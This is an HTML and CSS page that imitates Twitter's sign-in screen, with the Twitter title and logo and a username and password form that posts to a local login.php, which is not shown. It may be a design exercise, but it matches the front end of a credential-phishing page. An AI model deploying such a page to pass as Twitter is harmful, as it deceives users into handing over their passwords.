<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" href="twitter-logo.png" type="image/png">
    <title>Sign in to Twitter</title>

    <!-- Author: Sajjad -->

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f8fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo img {
            width: 50px;
            margin-bottom: 20px;
        }

        h2 {
            margin-bottom: 20px;
            color: #1da1f2;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccd6dd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #1da1f2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }

        .login-btn:hover {
            background-color: #1991da;
        }

        .forgot-password {
            margin-top: 15px;
        }

        .forgot-password a {
            color: #1da1f2;
            text-decoration: none;
        }

        .signup {
            margin-top: 20px;
        }

        .signup a {
            color: #1da1f2;
            text-decoration: none;
        }

        .signup span {
            color: #657786;
        }

		.input-group input:hover{
			border: 1px solid #1da1f2;
		}
        
        @media (max-width: 400px) {
            .logo img {
                width: 40px;
            }

            .login-container {
                padding: 15px;
            }

            .input-group input {
                padding: 8px;
            }

            .login-btn {
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="twitter-logo.png" alt="Twitter Logo">
        </div>
        <h2>Sign in to Twitter</h2>
        <form method="post" action="login.php">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone, email, or username" required></input>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required></input>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        <div class="signup">
            <span>Don't have an account? </span><a href="#">Sign up for Twitter</a>
        </div>
    </div>
</body>
</html>
